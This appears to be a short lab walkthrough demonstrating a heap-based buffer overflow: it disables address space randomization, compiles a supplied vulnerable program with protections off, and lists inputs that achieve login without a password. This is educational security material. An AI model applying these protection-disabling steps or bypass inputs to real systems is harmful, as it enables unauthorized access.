# Buffer Overflow Vulnerability

The heap based attack can be demonstrated by running following steps. Let us go through them.

## Initial Setup of the Machine

To make our attack easier, we first need to disable address space
randomization, a defense against buffer overflows making guessing addresses in
the heap and stack more difficult.  To do so, we simply need to run the
following command under root privileges:

```
sudo sysctl -w kernel.randomize_va_space=0
```

A confirmation of the variable's value is printed `kernel.randomize_va_space = 0`
by the terminal. 


## Vulnerable Program

The vulnerable program is provided in the [heap.c](heap.c) file.  

```
gcc -o heap -z execstack -fno-stack-protector heap.c
```

## Exploiting the Vulnerability: Demonstration of the Buffer Overflow Attack

To demonstrate the buffer flow attack, we run the following commands:

```
./heap
```

This simply compiles and runs the [heap.c](heap.c) file. 
After this, we see the effect of heap_based overflow helping us login without actually entering the password.
```
auth bufferoverflow.net
login # not logged in yet
login 234 # not logged in yet
service heapoverflow.net
login # logged in now
service 23
login # logged in now
```






